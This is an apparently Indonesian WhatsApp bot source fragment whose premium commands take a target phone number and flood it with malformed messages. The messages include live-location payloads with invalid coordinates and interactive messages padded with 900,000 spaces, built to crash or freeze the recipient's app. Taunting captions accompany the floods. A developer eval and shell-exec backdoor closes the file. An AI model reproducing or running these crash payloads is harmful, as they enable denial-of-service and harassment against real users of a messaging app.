case 'penjas': case 'ipa': case 'ips': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: force })
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'riper': case 'guru': case 'kepsek': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: force })
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'null-chace': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
ngeloc(m.chat, force)
}
await joreply('✅')
}
break
//=================================================//
case '500k': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
ngeloc(m.chat, force)
}
await joreply('✅')
}
break
//=================================================//
case 'senggol': {
if (!isPremium) return 
for (let j = 0; j < 5; j++) {
await ngeloc(m.chat, force)
}
await ryozingod.sendMessage(m.chat, {
contextInfo: {
mentionedJid: ['000000000000000000000000000000000@s.whatsapp.net'],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
jpegThumbnail: fakejpg,
title: `⦃ ••• ⦄ ⦃| . |⦄ ⦃ ••• ⦄`,
body: `⁗ ⋄ mati aja lu suki 😂`,
previewType: "VIDEO",
sourceUrl: `༑ . #𝐋𝐞𝐗𝐜𝐙 ⿻`,
mediaType: 1,
mediaUrl: 'https://www.instagram.com/__ffajrii'
}
},
text: '<★> Stm Kapal Karam ni bos\n<!#- siap membantai suki liar\n\n#senggoldong'
}, {
quoted: m
})
}
break
//=================================================//
case '300k': {
if (!isPremium) return 
for (let j = 0; j < 5; j++) {
await ngeloc(m.chat, force)
}
await ryozingod.sendMessage(m.chat, {
contextInfo: {
mentionedJid: ['00000@s.whatsapp.net'],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
jpegThumbnail: fakejpg,
title: `⦃ ••• ⦄ ⦃| . |⦄ ⦃ ••• ⦄`,
body: `⁗ ⋄ mati aja lu suki 😂`,
previewType: "VIDEO",
sourceUrl: `༑ . #𝐋𝐞𝐗𝐜𝐙 ⿻`,
mediaType: 1,
mediaUrl: 'https://www.instagram.com/__ffajrii'
}
},
text: '<★> Stm Kapal Karam ni bos\n<!#- siap membantai suki liar\n\n#senggoldong'
}, {
quoted: m
})
}
break
//=================================================//
case 'prikitiw': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877`)
let target = bijipler + '@s.whatsapp.net'
  for (let j = 10; j < q; j++) {
    await ngeloc(target, ryobug)
  }
 await joreply('✅')
}
break
//=================================================//
case '200k': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(900000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
await sleep(700)
}
}
break
//=================================================//
case 'bgtes2': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(900000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
await sleep(700)
}
}
break
//=================================================//

default:
if (budy.startsWith('=>')) {
if (!isDeveloper) return joreply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return joreply(bang)
}
try {
joreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
joreply(String(e))
}
}
//=================================================//
if (budy.startsWith('>')) {
if (!isDeveloper) return joreply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await joreply(evaled)
} catch (err) {
await joreply(String(err))
}
}
//=================================================//
if (budy.startsWith('$')) {
if (!isDeveloper) return joreply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if (err) return joreply(`${err}`)
if (stdout) return joreply(`${stdout}`)
})
}
}
} catch (err) {
peki = async () => {
ryozingod.sendMessage(global.ownMain + '@s.whatsapp.net', {text: require('util').format(err)}, {quoted: m})
await sleep(1000)
m.reply(`
❌ Eror Ditemukan. Eror Succes Dilaporkan Ke Contributor Bot, Mohon Tunggu Beberapa Waktu Sampai Owner Memperbaiki Eror Tersebut ✅

${util.format(err)}`)
console.log(util.format(err))
}
peki()
}
}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
